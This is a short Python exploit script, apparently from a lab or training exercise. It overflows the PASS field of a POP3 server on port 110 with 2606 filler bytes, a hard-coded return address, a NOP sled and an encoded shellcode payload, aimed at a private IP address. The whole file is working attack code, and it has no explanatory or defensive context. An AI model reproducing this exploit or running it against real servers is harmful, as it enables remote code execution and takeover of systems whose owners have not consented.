#!/usr/bin/python3
import socket
#5f 4a 35 8f
#5f 4c 06 7b
shellcode = (
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe9\xe1\x28" +
"\x3e\x83\xeb\xfc\xe2\xf4\x15\x8b\xc3\x73\x01\x18\xd7\xc1\x16\x81" +
"\xa3\x52\xcd\xc5\xa3\x7b\xd5\x6a\x54\x3b\x91\xe0\xc7\xb5\xa6\xf9" +
"\xa3\x61\xc9\xe0\xc3\x77\x62\xd5\xa3\x3f\x07\xd0\xe8\xa7\x45\x65" +
"\xe8\x4a\xee\x20\xe2\x33\xe8\x23\xc3\xca\xd2\xb5\x0c\x16\x9c\x04" +
"\xa3\x61\xcd\xe0\xc3\x58\x62\xed\x63\xb5\xb6\xfd\x29\xd5\xea\xcd" +
"\xa3\xb7\x85\xc5\x34\x5f\x2a\xd0\xf3\x5a\x62\xa2\x18\xb5\xa9\xed" +
"\xa3\x4e\xf5\x4c\xa3\x7e\xe1\xbf\x40\xb0\xa7\xef\xc4\x6e\x16\x37" +
"\x4e\x6d\x8f\x89\x1b\x0c\x81\x96\x5b\x0c\xb6\xb5\xd7\xee\x81\x2a" +
"\xc5\xc2\xd2\xb1\xd7\xe8\xb6\x68\xcd\x58\x68\x0c\x20\x3c\xbc\x8b" +
"\x2a\xc1\x39\x89\xf1\x37\x1c\x4c\x7f\xc1\x3f\xb2\x7b\x6d\xba\xa2" +
"\x7b\x7d\xba\x1e\xf8\x56\x29\x49\x28\x54\x8f\x89\x29\x82\x8f\xb2" +
"\xa1\xdf\x7c\x89\xc4\xc7\x43\x81\x7f\xc1\x3f\x8b\x38\x6f\xbc\x1e" +
"\xf8\x58\x83\x85\x4e\x56\x8a\x8c\x42\x6e\xb0\xc8\xe4\xb7\x0e\x8b" +
"\x6c\xb7\x0b\xd0\xe8\xcd\x43\x74\xa1\xc3\x17\xa3\x05\xc0\xab\xcd" +
"\xa5\x44\xd1\x4a\x83\x95\x81\x93\xd6\x8d\xff\x1e\x5d\x16\x16\x37" +
"\x73\x69\xbb\xb0\x79\x6f\x83\xe0\x79\x6f\xbc\xb0\xd7\xee\x81\x4c" +
"\xf1\x3b\x27\xb2\xd7\xe8\x83\x1e\xd7\x09\x16\x31\x40\xd9\x90\x27" +
"\x51\xc1\x9c\xe5\xd7\xe8\x16\x96\xd4\xc1\x39\x89\xd8\xb4\xed\xbe" +
"\x7b\xc1\x3f\x1e\xf8\x3e")

# data = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*8 + shellcode
data = "A"*2606 + "\x7b\x06\x4c\x5f" + "\x90"*8 + shellcode
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.121", 110))
    print(s.recv(1024))
    s.send(b"USER admin\r\n")
    print(s.recv(1024))
    s.send(b"PASS " + bytes(data, encoding="utf-8") + b"\r\n")
    print("Done!")
except:
    print("could not connect to pop3")
